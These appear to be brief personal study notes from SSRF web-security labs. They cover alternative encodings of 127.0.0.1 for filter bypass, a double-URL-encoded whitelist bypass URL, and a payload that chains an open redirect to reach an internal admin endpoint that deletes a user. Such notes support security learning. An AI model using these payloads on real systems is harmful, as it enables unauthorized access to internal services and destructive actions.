Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.

you can use ope redirect to SSRF

lesson:
if url has basic auth enabled look for ssrf and whitelist bypass. cause you can do 
http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
# is double url encoded

you find an openredirect. if that path is in a url that the server send requests you can use that open redirect to.
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username%3dcarlos.
frontend did this:
/product/nextProduct?currentProductId=2&path=/product?productId=3
